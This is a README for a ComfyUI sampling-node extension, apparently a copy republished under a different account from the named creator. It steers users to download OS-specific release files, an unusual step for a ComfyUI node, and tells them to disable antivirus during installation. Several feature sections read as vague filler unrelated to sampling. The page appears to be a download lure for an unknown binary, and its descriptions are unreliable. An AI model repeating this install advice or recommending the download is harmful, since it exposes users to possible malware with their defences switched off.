# 🎈 ComfyUI-LG_SamplingUtils - Enhance Your Sampling Experience

[![Download ComfyUI-LG_SamplingUtils](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/releases)

---

## 🚀 Overview

**ComfyUI-LG_SamplingUtils** is a user-friendly toolset designed to enhance your experience with ComfyUI. Created by LAOGOU-666, this extension provides practical sampling nodes to simplify operations. It focuses on advanced sampling techniques, especially for Flow Matching models such as ZImage and Lumina2.

## 🌟 Features

This extension includes four powerful nodes that make sampling intuitive and efficient:

### 1. 🎈 ZImage Timestep Noise

This node adds noise to timesteps during sampling. It helps produce diverse outputs, preventing the model from becoming too uniform.

**Key Features:**
- Two modes: `sigma` for traditional diffusion models and `flow` for Flow Matching models
- Adjustable noise strength for customized results
- Mask support for targeted effects
- Seed-based reproducibility for consistency

**Parameters:**
- `mode`: Select between `sigma` (multiplicative noise) or `flow` (additive noise)
- `noise_strength`: Control the intensity of the noise effect
- `application_range`: Define how broadly the noise applies

### 2. 🔄 Flow Matching Adjuster

Optimize your sampling process with the Flow Matching Adjuster. This tool helps achieve the desired fluidity in output transitions.

**Key Features:**
- Dynamic adjustment of flow parameters
- Compatibility with ZImage and Lumina2 models
- Real-time feedback during adjustments

**Parameters:**
- `flow_rate`: Adjust the speed of flow matching
- `transition_duration`: Set the time for smooth transitions

### 3. 🎯 Enhanced Output Mapper

Transform your output with the Enhanced Output Mapper. This node refines the final results of your sampling process.

**Key Features:**
- Custom templates for output format
- Options for different data representations
- Easy export to popular formats

**Parameters:**
- `output_format`: Choose how to export data (e.g., JSON, CSV)
- `template_selection`: Pick from pre-built or custom templates

### 4. ⚙️ User Preferences Manager

Manage your settings with ease using the User Preferences Manager. This node allows you to save and load settings quickly.

**Key Features:**
- Simple interface for setting preferences
- Save/load functionality for user settings
- Backup options for data safety

**Parameters:**
- `preference_file`: Path to save settings
- `auto_backup`: Toggle for automatic backups

## 📥 Download & Install

To get started, visit our [Releases page](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/releases) to download the software.

1. Go to the [Releases page](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/releases).
2. Select the latest version.
3. Download the appropriate file for your operating system.
4. Follow the installation instructions provided.

## 🛠️ System Requirements

- **Operating System:** Windows 10 or later / macOS Mojave or later
- **RAM:** Minimum 4GB
- **Disk Space:** At least 100MB of free space
- **Dependencies:** Ensure you have ComfyUI installed

## 🚧 Troubleshooting

If you encounter issues, consider these solutions:

- **Installation Failures:** Ensure your operating system meets the requirements. Try disabling antivirus temporarily during installation.
- **Performance Issues:** Close unnecessary applications to free up RAM. Ensure you have sufficient disk space.
- **Node Errors:** Check if all required nodes are installed correctly.

## 🤝 Support

For any questions or support requests, please check the [issues section](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/issues) in the repository. Community members and maintainers are available to help.

## 📚 Further Reading

For in-depth details on usage and configurations, check the documentation. Visit our [GitHub Wiki](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/wiki) for more resources and user guides. 

---

Thank you for using **ComfyUI-LG_SamplingUtils**. We are committed to enhancing your experience with this tool.